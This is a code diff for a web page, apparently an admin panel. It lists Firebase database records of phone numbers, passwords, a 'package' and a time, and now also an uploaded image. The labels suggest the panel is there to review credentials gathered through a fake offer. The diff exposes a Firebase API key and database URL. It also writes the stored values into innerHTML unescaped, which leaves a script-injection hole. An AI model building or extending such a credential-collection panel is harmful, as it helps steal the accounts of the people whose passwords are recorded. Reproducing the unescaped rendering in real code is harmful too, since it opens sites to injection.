@@ -64,6 +64,15 @@
       font-size: 15px;
     }
 
+    .data-box img {
+      max-width: 200px;
+      max-height: 150px;
+      border-radius: 8px;
+      display: block;
+      margin: 10px 0;
+      border: 1px solid #ff4d4d;
+    }
+
     .btn {
       background-color: #ff4d4d;
       color: white;
@@ -73,6 +82,7 @@
       border-radius: 5px;
       cursor: pointer;
       font-size: 13px;
+      transition: background-color 0.3s;
     }
 
     .btn:hover {
@@ -109,7 +119,7 @@
 
   <script>
     const firebaseConfig = {
-      apiKey: "AIzaSyCuP6VscPxkQS5D5z7bCYWXijzaYCdbF2s",
+      apiKey: "AIzaSyCuP6VscPxkQS5z7bCYWXijzaYCdbF2s",
       authDomain: "starkoscript.firebaseapp.com",
       databaseURL: "https://starkoscript-default-rtdb.firebaseio.com",
       projectId: "starkoscript",
@@ -142,11 +152,17 @@
       entries.forEach(([key, val]) => {
         const div = document.createElement("div");
         div.className = "data-box";
+
         div.innerHTML = `
-          <p><strong>الرقم:</strong> ${val.num}</p>
-          <p><strong>كلمة المرور:</strong> ${val.pass}</p>
-          <p><strong>الباقة:</strong> ${val.pack}</p>
-          <p><strong>الوقت:</strong> ${val.time}</p>
+          <p><strong>الرقم:</strong> ${val.num || "-"}</p>
+          <p><strong>كلمة المرور:</strong> ${val.pass || "-"}</p>
+          <p><strong>الباقة:</strong> ${val.pack || "-"}</p>
+          <p><strong>الوقت:</strong> ${val.time || "-"}</p>
+          ${
+            val.img 
+            ? `<p><strong>الصورة:</strong></p><img src="${val.img}" alt="صورة الطلب" />`
+            : ''
+          }
           ${
             val.confirmed
               ? '<p class="confirmed">تم تأكيد الطلب</p>'
